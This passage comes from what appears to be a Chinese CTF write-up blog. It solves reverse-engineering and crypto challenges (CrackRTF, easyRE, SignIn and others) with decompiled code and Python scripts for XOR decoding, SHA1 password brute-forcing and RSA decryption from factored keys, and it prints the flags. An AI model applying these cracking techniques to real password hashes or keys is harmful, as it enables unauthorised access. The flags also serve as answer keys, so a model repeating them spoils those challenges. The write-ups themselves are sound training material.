    '\x1d',
    '(',
    '0',
    '4',
    '\x01',
    '\x06',
    '\x14',
    '4',
    ',',
    '\x1b',
    'U',
    '?',
    'o',
    '6',
    '*',
    ':',
    '\x01',
    'D',
    ';',
    '%',
    '\x13']
l=len(code)+1
for i in range(l-3 ,-1, -1):
    code[i] = chr(ord(code[i])^ord(code[i + 1]))
for j in range(l-1):
    flag+=chr((ord(code[j])-j)%128)
print(flag)
</code></pre>
<h2 id="crackrtf">CrackRTF</h2>
<p>md5生成一个128bit的结果，通常用32位的16进制字符串表示<br>
sha1生成一个160bit的结果，通常用40位的16进制字符串表示</p>
<pre><code>memset(&amp;v3, 0xCCu, 0x350u);
  memset(&amp;pbData, 0, 0x104u);
  memset(&amp;String1, 0, 0x104u);
  v5 = 0;
  printf(&quot;pls input the first passwd(1): &quot;);
  scanf(&quot;%s&quot;, &amp;pbData);
  if ( strlen((const char *)&amp;pbData) != 6 )
  {
    printf(&quot;Must be 6 characters!\n&quot;);
    ExitProcess(0);
  }
  v5 = unknown_libname_1((char *)&amp;pbData);
  if ( v5 &lt; 100000 )
    ExitProcess(0);
  strcat((char *)&amp;pbData, &quot;@DBApp&quot;);
  v0 = strlen((const char *)&amp;pbData);
  sub_40100A(&amp;pbData, v0, &amp;String1);
  if ( !_strcmpi(&amp;String1, &quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;) )
  {
    printf(&quot;continue...\n\n&quot;);
    printf(&quot;pls input the first passwd(2): &quot;);
    memset(&amp;String, 0, 0x104u);
    scanf(&quot;%s&quot;, &amp;String);
    if ( strlen(&amp;String) != 6 )
    {
      printf(&quot;Must be 6 characters!\n&quot;);
      ExitProcess(0);
    }
    strcat(&amp;String, (const char *)&amp;pbData);
    memset(&amp;String1, 0, 0x104u);
    v1 = strlen(&amp;String);
    sub_401019((BYTE *)&amp;String, v1, &amp;String1);
    if ( !_strcmpi(&quot;27019e688a4e62a649fd99cadaafdb4e&quot;, &amp;String1) )
    {
      if ( !sub_40100F(&amp;String) )
      {
        printf(&quot;Error!!\n&quot;);
        ExitProcess(0);
      }
      printf(&quot;bye ~~\n&quot;);
    }
  }
  return 0;
</code></pre>
<p>主函数代码意思就是比较两次，需要输入两次密码，当密码长度不为6时退出，当密码长度为6时继续比较第二个，第一次输入后在后边添加&quot;@DBApp&quot;，第二次输入后在后边添加第一次添加&quot;@DBApp&quot;后的字符串(即12位字符串pbDate)</p>
<p>两个关键函数sub_40100A，sub_401019</p>
<h3 id="sub_40100a">sub_40100A</h3>
<pre><code>  memset(&amp;v4, 0xCCu, 0x68u);
  if ( CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) )
  {
    if ( CryptCreateHash(phProv, 0x8004u, 0, 0, &amp;phHash) )
    {
      if ( CryptHashData(phHash, pbData, dwDataLen, 0) )
      {
        CryptGetHashParam(phHash, 2u, v7, &amp;pdwDataLen, 0);
        *lpString1 = 0;
        for ( i = 0; i &lt; pdwDataLen; ++i )
        {
          wsprintfA(&amp;String2, &quot;%02X&quot;, v7[i]);
          lstrcatA(lpString1, &amp;String2);
        }
        CryptDestroyHash(phHash);
        CryptReleaseContext(phProv, 0);
        result = 1;
      }
      else
      {
        CryptDestroyHash(phHash);
        CryptReleaseContext(phProv, 0);
        result = 0;
      }
    }
    else
    {
      CryptReleaseContext(phProv, 0);
      result = 0;
    }
  }
  else
  {
    result = 0;
  }
  return result;
}
</code></pre>
<p>可以看出是sha1加密</p>
<h4 id="爆破脚本">爆破脚本</h4>
<pre><code>from hashlib import sha1
flag = &quot;@DBApp&quot;
for i in range(100000,999999):
   s = str(i)+flag
   x = sha1(s.encode()) #对unicode对象编码
   cnt = x.hexdigest() #产出hash值,拿到加密字符串
   if &quot;6e32d0943418c2c&quot; in cnt:
      print(cnt)
      print(str(i)+flag)
</code></pre>
<h3 id="sub_401019">sub_401019</h3>
<pre><code>  memset(&amp;v4, 0xCCu, 0x64u);
  if ( CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) )
  {
    if ( CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash) )
    {
      if ( CryptHashData(phHash, pbData, dwDataLen, 0) )
      {
        CryptGetHashParam(phHash, 2u, v7, &amp;pdwDataLen, 0);
        *lpString1 = 0;
        for ( i = 0; i &lt; pdwDataLen; ++i )
        {
          wsprintfA(&amp;String2, &quot;%02X&quot;, v7[i]);
          lstrcatA(lpString1, &amp;String2);
        }
        CryptDestroyHash(phHash);
        CryptReleaseContext(phProv, 0);
        result = 1;
      }
      else
      {
        CryptDestroyHash(phHash);
        CryptReleaseContext(phProv, 0);
        result = 0;
      }
    }
    else
    {
      CryptReleaseContext(phProv, 0);
      result = 0;
    }
  }
  else
  {
    result = 0;
  }
  return result;
}
</code></pre>
<p>这里的md5解密失败继续看发现sub_40100F</p>
<h3 id="sub_40100f">sub_40100F</h3>
<pre><code>  memset(&amp;v2, 0xCCu, 0x60u);
  hFile = 0;
  hResInfo = 0;
  hResData = 0;
  nNumberOfBytesToWrite = 0;
  NumberOfBytesWritten = 0;
  v5 = 0;
  lpBuffer = 0;
  v3 = 0;
  hResInfo = FindResourceA(0, (LPCSTR)0x65, &quot;AAA&quot;);// 使用FindResourceA( )查找资源，类型是&quot;AAA&quot;，名称101(0x65)
  if ( hResInfo )
  {
    nNumberOfBytesToWrite = SizeofResource(0, hResInfo);
    hResData = LoadResource(0, hResInfo);
    if ( hResData )
    {
      lpBuffer = LockResource(hResData);
      sub_401005(lpString, (int)lpBuffer, nNumberOfBytesToWrite);// 异或操作
      hFile = CreateFileA(&quot;dbapp.rtf&quot;, 0x10000000u, 0, 0, 2u, 0x80u, 0);// 生成一个.rtf文件
      if ( hFile == (HANDLE)-1 )
      {
        result = 0;
      }
      else if ( WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, 0) )
      {
        CloseHandle(hFile);
        result = 1;
      }
      else
      {
        result = 0;
      }
    }
    else
    {
      result = 0;
    }
  }
  else
  {
    result = 0;
  }
  return result;
}
</code></pre>
<p>用ResourceHacker查看文件中的资源</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1602344545539.png" alt="" loading="lazy"></figure>
<p>异或函数如下</p>
<pre><code>  memset(&amp;v4, 0xCCu, 0x4Cu);
  v7 = lstrlenA(lpString);
  v6 = lpString;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i &gt;= a3 )
      break;
    *(_BYTE *)(i + a2) ^= v6[i % v7];
  }
  return result;
</code></pre>
<p>这里的a2是AAA中资源的首位指针，v7是密码长度</p>
<p>脚本</p>
<pre><code>s = &quot;{\\rtf1&quot;
a = [0x05, 0x7D, 0x41, 0x15, 0x26, 0x01]
flag = &quot;&quot;
for i in range(0, len(s)):
    x = ord(s[i]) ^ a[i]
    flag += chr(x)
print(flag)
</code></pre>
<p>s是rtf文件的6位头部</p>
<p>得到两个6位密码后输入并打开生出的rtf文件，得flag=Flag{N0_M0re_Free_Bugs}</p>
<h2 id="youngter-drive">Youngter-drive</h2>
<p>发现有upx壳，在ubuntu里用upx -d脱壳后放入ida6.8里找不到main函数，放入ida7.0里正常找到</p>
<h3 id="主要函数">主要函数</h3>
<pre><code>main函数

  sub_4110FF(this);                             // input函数
  ::hObject = CreateMutexW(0, 0, 0);            // 创建一个互斥体
  j_strcpy(Dest, Source);                       // 复制到Dest里
  hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);// 建立新的线程
  v2 = CreateThread(0, 0, sub_41119F, 0, 0, 0); // 与上一行相比多了一个sub_41112C函数
  CloseHandle(hObject);
  CloseHandle(v2);
  while ( dword_418008 != -1 )
    ;
  sub_411190();                                 // 比较并输出函数
  CloseHandle(::hObject);
  return 0;

StartAddress函数
  while ( 1 )
  {
    WaitForSingleObject(hObject, 0xFFFFFFFF);
    if ( dword_418008 &gt; -1 )
    {
      sub_41112C(Source, dword_418008);         // dword=1Dh
      --dword_418008;
      Sleep(0x64u);
    }
    ReleaseMutex(hObject);

sub_41119F函数
  while ( 1 )
  {
    WaitForSingleObject(hObject, 0xFFFFFFFF);
    if ( dword_418008 &gt; -1 )
    {
      Sleep(0x64u);
      --dword_418008;
    }
    ReleaseMutex(hObject);
  }

sub_411190函数
  for ( i = 0; i &lt; 29; ++i )
  {
    if ( Source[i] != off_418004[i] )           // TOiZiZtOrYaToUwPnToBsOaOapsyS
      exit(0);
  }
  return printf(&quot;\nflag{%s}\n\n&quot;, Dest);
  
sub_41112C函数（在StartAddress函数里）
  v3 = *(a2 + a1);                              // a1是source,v3是a1[a2]
  if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) )// v3不是字母时退出
    exit(0);
  if ( v3 &lt; 97 || v3 &gt; 122 )                    // v3是大写字母时
  {
    result = off_418000[0];                     // QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasd
    *(a2 + a1) = off_418000[0][*(a2 + a1) - 38];
  }
  else                                          // v3是小写字母时
  {
    result = off_418000[0];
    *(a2 + a1) = off_418000[0][*(a2 + a1) - 96];
  }
  return result;
</code></pre>
<p>sub_41112C函数直接反编译会失败，原因是因为堆栈不平衡</p>
<pre><code>.text:00411A04 000                 retn
.text:00411A04     sub_411940      endp ; sp-analysis failed
</code></pre>
<p>这里000本来是-04，将其调成000即可光标放在上边Alt+k修改</p>
<p>线程hObject进行加密，v2就是dword_418008-1，即下标-1，他是倒叙着比较的，相当于先比较source[29]再比较souce[28],但是输出flag时是正序,当比较29时加密，28时正常输出，依次递减，即下标是偶数时直接打印off_418004中的数，是奇数时则需要变换；变换思路以及得flag的脚本如下</p>
<pre><code>off_418000 = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;
off_418004 = &quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;
flag=''
#print(len(off_418004))
for i in range(len(off_418004)):
    if i%2 == 0:
        flag += off_418004[i]
    else:
        if(off_418004[i].isupper()):#isupper判断是否为大写字母
            flag = flag + chr(off_418000.find(off_418004[i])+96)
            #对应*(a2 + a1) = off_418000[0][*(a2 + a1) - 96];思路：先找到下标数即*(a2 + a1) - 96再+96就为flag，这里*(a2 + a1)对应source，因为source与off_418004进行了比较所以相当于其字符串，即用find函数寻找off_418004中字符在off_418000中的下标
        else:
            flag = flag + chr(off_418000.find(off_418004[i])+38)
print(flag)
</code></pre>
<p>得flag为29位，因为输出函数中比较了29位，我们需要自己再加一位，但是只有加E的时候正确</p>
<h2 id="2019红帽杯easyre">[2019红帽杯]easyRE</h2>
<p>ida64位打开，shift+f12查找字符串找到“you found me&quot;，交叉引用找到主函数</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  int result; // eax
  unsigned __int64 v5; // rax
  __int64 v6; // rax
  const __m128i *v7; // ST10_8
  const __m128i *v8; // ST18_8
  const __m128i *v9; // ST20_8
  const __m128i *v10; // ST28_8
  const __m128i *v11; // ST30_8
  const __m128i *v12; // ST38_8
  const __m128i *v13; // ST40_8
  const __m128i *v14; // ST48_8
  const __m128i *v15; // ST50_8
  __int64 v16; // ST58_8
  int i; // [rsp+Ch] [rbp-114h]
  char v18; // [rsp+60h] [rbp-C0h]
  char v19; // [rsp+61h] [rbp-BFh]
  char v20; // [rsp+62h] [rbp-BEh]
  char v21; // [rsp+63h] [rbp-BDh]
  char v22; // [rsp+64h] [rbp-BCh]
  char v23; // [rsp+65h] [rbp-BBh]
  char v24; // [rsp+66h] [rbp-BAh]
  char v25; // [rsp+67h] [rbp-B9h]
  char v26; // [rsp+68h] [rbp-B8h]
  char v27; // [rsp+69h] [rbp-B7h]
  char v28; // [rsp+6Ah] [rbp-B6h]
  char v29; // [rsp+6Bh] [rbp-B5h]
  char v30; // [rsp+6Ch] [rbp-B4h]
  char v31; // [rsp+6Dh] [rbp-B3h]
  char v32; // [rsp+6Eh] [rbp-B2h]
  char v33; // [rsp+6Fh] [rbp-B1h]
  char v34; // [rsp+70h] [rbp-B0h]
  char v35; // [rsp+71h] [rbp-AFh]
  char v36; // [rsp+72h] [rbp-AEh]
  char v37; // [rsp+73h] [rbp-ADh]
  char v38; // [rsp+74h] [rbp-ACh]
  char v39; // [rsp+75h] [rbp-ABh]
  char v40; // [rsp+76h] [rbp-AAh]
  char v41; // [rsp+77h] [rbp-A9h]
  char v42; // [rsp+78h] [rbp-A8h]
  char v43; // [rsp+79h] [rbp-A7h]
  char v44; // [rsp+7Ah] [rbp-A6h]
  char v45; // [rsp+7Bh] [rbp-A5h]
  char v46; // [rsp+7Ch] [rbp-A4h]
  char v47; // [rsp+7Dh] [rbp-A3h]
  char v48; // [rsp+7Eh] [rbp-A2h]
  char v49; // [rsp+7Fh] [rbp-A1h]
  char v50; // [rsp+80h] [rbp-A0h]
  char v51; // [rsp+81h] [rbp-9Fh]
  char v52; // [rsp+82h] [rbp-9Eh]
  char v53; // [rsp+83h] [rbp-9Dh]
  char v54[32]; // [rsp+90h] [rbp-90h]
  int v55; // [rsp+B0h] [rbp-70h]
  char v56; // [rsp+B4h] [rbp-6Ch]
  char v57; // [rsp+C0h] [rbp-60h]
  char v58; // [rsp+E7h] [rbp-39h]
  char v59; // [rsp+100h] [rbp-20h]
  unsigned __int64 v60; // [rsp+108h] [rbp-18h]

  v60 = __readfsqword(0x28u);
  v18 = 73;
  v19 = 111;
  v20 = 100;
  v21 = 108;
  v22 = 62;
  v23 = 81;
  v24 = 110;
  v25 = 98;
  v26 = 40;
  v27 = 111;
  v28 = 99;
  v29 = 121;
  v30 = 127;
  v31 = 121;
  v32 = 46;
  v33 = 105;
  v34 = 127;
  v35 = 100;
  v36 = 96;
  v37 = 51;
  v38 = 119;
  v39 = 125;
  v40 = 119;
  v41 = 101;
  v42 = 107;
  v43 = 57;
  v44 = 123;
  v45 = 105;
  v46 = 121;
  v47 = 61;
  v48 = 126;
  v49 = 121;
  v50 = 76;
  v51 = 64;
  v52 = 69;
  v53 = 67;
  memset(v54, 0, sizeof(v54));                  // 初始化v54为0
  v55 = 0;
  v56 = 0;
  sub_4406E0(0LL, v54);
  v56 = 0;
  LODWORD(v3) = sub_424BA0(v54);
  if ( v3 == 36 )
  {
    for ( i = 0; ; ++i )
    {
      LODWORD(v5) = sub_424BA0(v54);
      if ( i &gt;= v5 )
        break;
      if ( (v54[i] ^ i) != *(&amp;v18 + i) )        // v18[i],第一个关键异或，求出v54
      {
        result = -2;
        goto LABEL_13;
      }
    }
    sub_410CC0(&quot;continue!&quot;);
    memset(&amp;v57, 0, 0x40uLL);                   // v57置零
    v59 = 0;
    sub_4406E0(0LL, &amp;v57);
    v58 = 0;
    LODWORD(v6) = sub_424BA0(&amp;v57);             // 生出v6=39
    if ( v6 == 39 )
    {
      v7 = sub_400E44(&amp;v57);
      v8 = sub_400E44(v7);
      v9 = sub_400E44(v8);
      v10 = sub_400E44(v9);
      v11 = sub_400E44(v10);
      v12 = sub_400E44(v11);
      v13 = sub_400E44(v12);
      v14 = sub_400E44(v13);
      v15 = sub_400E44(v14);
      v16 = sub_400E44(v15);
      if ( !sub_400360(v16, off_6CC090) )       // off_6CC090与v16进行比较，v16是经过十次相同变化的v57
      {
        sub_410CC0(&quot;You found me!!!&quot;);
        sub_410CC0(&quot;bye bye~&quot;);
      }
      result = 0;
    }
    else
    {
      result = -3;
    }
  }
  else
  {
    result = -1;
  }
LABEL_13:
  if ( __readfsqword(0x28u) != v60 )
    sub_444020();
  return result;
}
</code></pre>
<p>一共两个关键变化，一个是异或，一个是未知的相同10次变化，进入sub_400E44函数</p>
<pre><code>__int64 __fastcall sub_400E44(const __m128i *a1)
{
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  int v5; // [rsp+18h] [rbp-28h]
  int v6; // [rsp+1Ch] [rbp-24h]
  signed __int64 v7; // [rsp+20h] [rbp-20h]
  __int64 v8; // [rsp+30h] [rbp-10h]
  __int64 v9; // [rsp+38h] [rbp-8h]

  LODWORD(v1) = sub_424BA0(a1);
  v8 = v1;
  if ( v1 == 3 * (((6148914691236517206LL * v1) &gt;&gt; 64) - (v1 &gt;&gt; 63)) )
    v2 = ((6148914691236517206LL * v1) &gt;&gt; 64) - (v1 &gt;&gt; 63);
  else
    v2 = ((6148914691236517206LL * v1) &gt;&gt; 64) - (v1 &gt;&gt; 63) + 1;
  v7 = 4 * v2;
  v9 = sub_41EF60(4 * v2 + 1);
  *(v7 + v9) = 0;
  v5 = 0;
  v6 = 0;
  while ( v5 &lt; v7 - 2 )
  {
    *(v9 + v5) = aAbcdefghijklmn[(*(a1-&gt;m128i_i64 + v6) &gt;&gt; 2)];
    *(v9 + v5 + 1LL) = aAbcdefghijklmn[16 * (*(a1-&gt;m128i_i64 + v6) &amp; 3) | (*(a1-&gt;m128i_i64 + v6 + 1) &gt;&gt; 4)];
    *(v9 + v5 + 2LL) = aAbcdefghijklmn[4 * (*(a1-&gt;m128i_i64 + v6 + 1) &amp; 0xF) | (*(a1-&gt;m128i_i64 + v6 + 2) &gt;&gt; 6)];
    *(v9 + v5 + 3LL) = aAbcdefghijklmn[*(a1-&gt;m128i_i64 + v6 + 2) &amp; 0x3F];
    v6 += 3;
    v5 += 4;
  }
  v3 = v8 - 3 * (((6148914691236517206LL * v8) &gt;&gt; 64) - (v8 &gt;&gt; 63));
  if ( v3 == 1 )
  {
    *(v5 - 2LL + v9) = 61;
    *(v5 - 1LL + v9) = 61;
  }
  else if ( v3 == 2 )
  {
    *(v5 - 1LL + v9) = 61;
  }
  return v9;
}
</code></pre>
<p>容易看出是base64加密，我们则需要进行10次base64解密</p>
<h3 id="异或以及base64十次解密脚本">异或以及base64十次解密脚本</h3>
<pre><code>#异或
a=[73,111,100,108,62,81,110,98,40,111,99,121,127,121,46,105,127,100,96,51,119,125,119,101,107,57,123,105,121,61,126,121,76,64,69,67]
b=''
for i in range(len(a)):
	b+=chr(a[i]^i)
print(b)

#base64十次解密
import base64
url = &quot;Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ==&quot;
for i in range(10):
    url = base64.b64decode(url)
print(url)
</code></pre>
<p>得到</p>
<pre><code>Info:The first four chars are `flag`
b'https://bbs.pediy.com/thread-254172.htm'
</code></pre>
<p>得知flag前四位为flag,进入网址没有题目相关内容，这时查看函数窗口发现main函数与base64加密函数之间还有一个函数，进入并尝试审计</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1602425912026.png" alt="" loading="lazy"></figure>
<pre><code>__int64 sub_400D35()
{
  __int64 result; // rax
  unsigned __int64 v1; // rt1
  unsigned int v2; // [rsp+Ch] [rbp-24h]
  signed int i; // [rsp+10h] [rbp-20h]
  signed int j; // [rsp+14h] [rbp-1Ch]
  unsigned int v5; // [rsp+24h] [rbp-Ch]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v2 = sub_43FD20(0LL) - qword_6CEE38;
  for ( i = 0; i &lt;= 1233; ++i )
  {
    sub_40F790(v2);
    sub_40FE60(v2);
    sub_40FE60(v2);
    v2 = sub_40FE60(v2) ^ 0x98765432;
  }
  v5 = v2;                                      // v5=v2
  if ( (v2 ^ byte_6CC0A0[0]) == 'f' &amp;&amp; (HIBYTE(v5) ^ byte_6CC0A3) == 'g' )// byte_6CC0A3相当于byte_6CC0A0[3]，即v2与byte_6CC0A0数组异或后第一位为f第四位为g时进入下一个异或，又因为已知前四位为flag，所以观察并进入下一个异或
  {
    for ( j = 0; j &lt;= 24; ++j )
      sub_410E90((byte_6CC0A0[j] ^ *(&amp;v5 + j % 4)));
  }
  v1 = __readfsqword(0x28u);
  result = v1 ^ v6;
  if ( v1 != v6 )
    sub_444020();
  return result;
}
</code></pre>
<p>也是一个异或函数，脚本如下</p>
<pre><code>byte_6CC0A0=[0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F,
0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E,
0x72, 0x3C, 0x32, 0x45,0x5B]
v2=''
s='flag'
flag=''
for i in range(4):
    v2+=chr(byte_6CC0A0[i]^ord(s[i]))
for i in range(len(byte_6CC0A0)):
    flag+=chr(byte_6CC0A0[i]^ord(v2[i%4]))
print (flag)
</code></pre>
<p>得flag=flag{Act1ve_Defen5e_Test}</p>
<h2 id="actf新生赛2020easyre">[ACTF新生赛2020]easyre</h2>
<p>有upx壳，脱壳后放入ida</p>
<p>主函数</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+12h] [ebp-2Eh]
  char v5; // [esp+13h] [ebp-2Dh]
  char v6; // [esp+14h] [ebp-2Ch]
  char v7; // [esp+15h] [ebp-2Bh]
  char v8; // [esp+16h] [ebp-2Ah]
  char v9; // [esp+17h] [ebp-29h]
  char v10; // [esp+18h] [ebp-28h]
  char v11; // [esp+19h] [ebp-27h]
  char v12; // [esp+1Ah] [ebp-26h]
  char v13; // [esp+1Bh] [ebp-25h]
  char v14; // [esp+1Ch] [ebp-24h]
  char v15; // [esp+1Dh] [ebp-23h]
  int v16; // [esp+1Eh] [ebp-22h]
  int v17; // [esp+22h] [ebp-1Eh]
  int v18; // [esp+26h] [ebp-1Ah]
  __int16 v19; // [esp+2Ah] [ebp-16h]
  char v20; // [esp+2Ch] [ebp-14h]
  char v21; // [esp+2Dh] [ebp-13h]
  char v22; // [esp+2Eh] [ebp-12h]
  int v23; // [esp+2Fh] [ebp-11h]
  int v24; // [esp+33h] [ebp-Dh]
  int v25; // [esp+37h] [ebp-9h]
  char v26; // [esp+3Bh] [ebp-5h]
  int i; // [esp+3Ch] [ebp-4h]

  sub_401A10();
  v4 = 42;
  v5 = 70;
  v6 = 39;
  v7 = 34;
  v8 = 78;
  v9 = 44;
  v10 = 34;
  v11 = 40;
  v12 = 73;
  v13 = 63;
  v14 = 43;
  v15 = 64;
  printf(&quot;Please input:&quot;);
  scanf(&quot;%s&quot;, &amp;v19);
  if ( (_BYTE)v19 != 'A' || HIBYTE(v19) != 'C' || v20 != 'T' || v21 != 'F' || v22 != '{' || v26 != '}' )
    return 0;
  v16 = v23;
  v17 = v24;
  v18 = v25;
  for ( i = 0; i &lt;= 11; ++i )
  {
    if ( *(&amp;v4 + i) != byte_402000[*((char *)&amp;v16 + i) - 1] )// v4到v15是一个十二位的数组  7Eh
      return 0;
  }
  printf(&quot;You are correct!&quot;);
  return 0;
}
</code></pre>
<p>提取byte_402000中的数值，flag为v16到v18的12位字符，flag的ascii值-1作为byte_402000的下标与v4开头v15结束的12个数做对比</p>
<p>脚本</p>
<pre><code>v4 = [42,70,39,34,78,44,34,40,73,63,43,64]
byte_402000= [0x7E, 0x7D, 0x7C, 0x7B, 0x7A, 0x79, 0x78, 0x77, 0x76, 0x75,
  0x74, 0x73, 0x72, 0x71, 0x70, 0x6F, 0x6E, 0x6D, 0x6C, 0x6B,
  0x6A, 0x69, 0x68, 0x67, 0x66, 0x65, 0x64, 0x63, 0x62, 0x61,
  0x60, 0x5F, 0x5E, 0x5D, 0x5C, 0x5B, 0x5A, 0x59, 0x58, 0x57,
  0x56, 0x55, 0x54, 0x53, 0x52, 0x51, 0x50, 0x4F, 0x4E, 0x4D,
  0x4C, 0x4B, 0x4A, 0x49, 0x48, 0x47, 0x46, 0x45, 0x44, 0x43,
  0x42, 0x41, 0x40, 0x3F, 0x3E, 0x3D, 0x3C, 0x3B, 0x3A, 0x39,
  0x38, 0x37, 0x36, 0x35, 0x34, 0x33, 0x32, 0x31, 0x30, 0x2F,
  0x2E, 0x2D, 0x2C, 0x2B, 0x2A, 0x29, 0x28, 0x27, 0x26, 0x25,
  0x24, 0x23, 0x20, 0x21, 0x22, 0x00]
b=''
flag=''
for i in range(len(byte_402000)):
    b+=chr(byte_402000[i])
for i in range(len(v4)):
    flag+=chr(b.find(chr(v4[i]))+1)
print(flag)
</code></pre>
<h2 id="suctf2019signin">[SUCTF2019]SignIn</h2>
<h3 id="主函数">主函数</h3>
<pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char v4; // [rsp+0h] [rbp-4A0h]
  char v5; // [rsp+10h] [rbp-490h]
  char v6; // [rsp+20h] [rbp-480h]
  char v7; // [rsp+30h] [rbp-470h]
  char v8; // [rsp+40h] [rbp-460h]
  char v9; // [rsp+B0h] [rbp-3F0h]
  unsigned __int64 v10; // [rsp+498h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  puts(&quot;[sign in]&quot;);
  printf(&quot;[input your flag]: &quot;, a2);
  __isoc99_scanf(&quot;%99s&quot;, &amp;v8);                  // 输入V8
  sub_96A(&amp;v8, (__int64)&amp;v9);
  __gmpz_init_set_str((__int64)&amp;v7, (__int64)&quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;, 16LL);// 将字符数组以16进制解读成数值并写入v7所指向的内存
  __gmpz_init_set_str((__int64)&amp;v6, (__int64)&amp;v9, 16LL);
  __gmpz_init_set_str(
    (__int64)&amp;v4,
    (__int64)&quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;,
    10LL);
  __gmpz_init_set_str((__int64)&amp;v5, (__int64)&quot;65537&quot;, 10LL);
  __gmpz_powm(&amp;v6, &amp;v6, &amp;v5, &amp;v4);              // 对明文的加密函数,计算v6的v5次方，并对v4取模，最后将结果写入v6,对应于RSA算法中就是n=v4,密文c=v7,公钥e=v5,明文m=v6
  if ( (unsigned int)__gmpz_cmp(&amp;v6, &amp;v7) )     // 比较函数
    puts(&quot;GG!&quot;);
  else
    puts(&quot;TTTTTTTTTTql!&quot;);
  return 0LL;
}
</code></pre>
<p>yafu或者在线解出来p,q都可以</p>
<h3 id="脚本-2">脚本</h3>
<pre><code>import gmpy2
import binascii
c=0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35
e=65537
n=103461035900816914121390101299049044413950405173712170434161686539878160984549
p=366669102002966856876605669837014229419
q=282164587459512124844245113950593348271
d = gmpy2.invert(e,(p-1)*(q-1))
m = pow(c,d,n)
#print(hex(m))
print(hex(m)[2:])#[2:]舍去0x
print(bytes.fromhex(hex(m)[2:]))
</code></pre>
<p>得flag=suctf{Pwn_@_hundred_years}</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CUMT校赛200923]]></title>
        <id>https://7usai.github.io/post/lgs4SdGy2/</id>
        <link href="https://7usai.github.io/post/lgs4SdGy2/">
        </link>
        <updated>2020-09-27T11:08:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cumt校赛">CUMT校赛</h1>
<p>[TOC]</p>
<h2 id="crypto">Crypto</h2>
<h3 id="幼儿园的密码题">幼儿园的密码题</h3>
<h4 id="脚本">脚本</h4>
<p>已知n求p,q</p>
<p>http://www.factordb.com/</p>
<p>n,e,c转成10进制</p>
<pre><code>import gmpy2
p=324350545929838254331191385863847627003
q=328413456989577256301798468872388310877
n=106521084065274837947153338013414677016150003618052696631715598225251903811631
c=40448992051548719008529549070468060415257485938698092782029814901918646701101
e=65537
d = gmpy2.invert(e,(p-1)*(q-1))
key=pow(c, d, n)
print(d)
print(key)
</code></pre>
<p>得出来的key转十六进制再转字符(真的真的很没意思)</p>
<h3 id="小学生的密码题">小学生的密码题</h3>
<pre><code>from secret import flag
def encode(ptext):
    dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;}&quot;) + 1)]   		;dic='ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_'abcdefghijklmnopqrstuvwxyz{|}~
    m = [i for i in ptext]					;m=flag
    tmp = [];s = []						创建临时tmp和s
    for i in range(len(m)):					;range(flag长度)	
        for j in range(len(dic)):					;range(62)
            if m[i] == dic[j]:					;flag[i]==dic[j] 即为A到~时
                tmp.append(j + 1)					;tmp+=j+1(相当于ord(dic[j])-63)
    for i in tmp:						;遍历tmp中的数
        res = &quot;&quot;						
        if i &gt;= 8:						i&gt;=8(dic[j]&gt;=71时)	
            res += int(i/8)*&quot;8&quot;
        if i%8 &gt;=4:						i%8&gt;=4	
            res += int(i%8/4)*&quot;4&quot;					
        if i%4 &gt;=2:						
            res += int(i%4/2)*&quot;2&quot;
        if i%2 &gt;= 1:						
            res += int(i%2/1)*&quot;1&quot;
